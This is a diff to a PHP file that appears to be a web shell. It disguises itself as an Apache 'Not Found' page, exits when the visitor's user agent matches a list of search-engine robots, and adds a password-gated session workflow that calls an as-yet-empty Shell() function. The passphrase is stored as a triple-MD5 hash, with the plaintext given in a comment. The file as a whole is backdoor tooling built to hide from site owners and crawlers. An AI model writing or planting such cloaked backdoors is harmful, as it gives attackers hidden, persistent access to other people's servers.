@@ -7,7 +7,7 @@
 
   /* Variables
   >>>>>>>>>>>>>>>>> */
-  define('password', 'cosasdepuma');
+  $passphrase = '136c757bdd877848762c248e58252935'; // cosasdepuma
 
   /* Headers
   >>>>>>>>>>>>>>>>> */
@@ -21,7 +21,7 @@
   );
 
   foreach($robots as $robot)
-    if( strpos($_SERVER['HTTP_USER_AGENT'],$robot) !== false )
+    if(strpos($_SERVER['HTTP_USER_AGENT'],$robot) !== false)
       exit;
 
   /* Functions
@@ -32,7 +32,7 @@
     <h1>Not Found</h1>
     <p>The request URL <?=dirname($_SERVER['REQUEST_URI'])?> was not found on this server.</p>
     <hr>
-    <address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
+    <address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
 
     <center>
       <form method="post">
@@ -43,5 +43,27 @@
     <?php exit;
   }
 
-  ApacheNotFound();
+  function Shell() {
+    ?>
+    
+    <?php
+  }
+
+  /* Workflow
+  >>>>>>>>>>>>>>>>> */
+  if(isset($_GET['out'])) {
+    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+    header("Refresh:0; url=" . explode('?', $_SERVER[REQUEST_URI])[0]);
+    die();
+  }
+
+  if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if(empty($passphrase) || (isset($_POST['passwd']) && (md5(md5(md5($_POST['passwd']))) == $passphrase))) {
+      $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    } else {
+      ApacheNotFound();
+    }
+  } else {
+    Shell();
+  }
 ?>
